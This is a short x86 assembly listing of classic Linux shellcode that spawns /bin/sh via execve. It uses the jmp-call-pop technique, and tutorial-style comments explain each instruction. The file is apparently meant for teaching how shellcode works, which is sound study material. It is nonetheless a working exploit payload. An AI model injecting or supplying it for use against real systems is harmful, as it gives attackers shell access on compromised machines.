BITS    32      ;

jmp short two       ; Jump down for the call trick

one:
; int execve(filename,argv[],envp[])
pop     ebx             ; EBX has address of the string
xor     eax,eax         ; Zero out EAX
mov     [ebx+7],al      ; NULL terminate /bin/sh string
mov     [ebx+8],ebx     ; put addr from EBX where AAAA is
mov     [ebx+12],eax    ; put 32 bit null terminator where BBBB is
lea     ecx, [ebx+8]    ; load [EBX+8] into ECX for argv ptr
lea     edx, [ebx+12]   ; EDX = EBX+12 , envp ptr
mov     al,11           ; syscall 11 = execve()
int     0x80            ; trigger syscall

two:
call    one             ; Use call to string address
db      '/bin/shXAAAABBBB'  ; XAAAABBBB are used for visual clarity (not reqrd)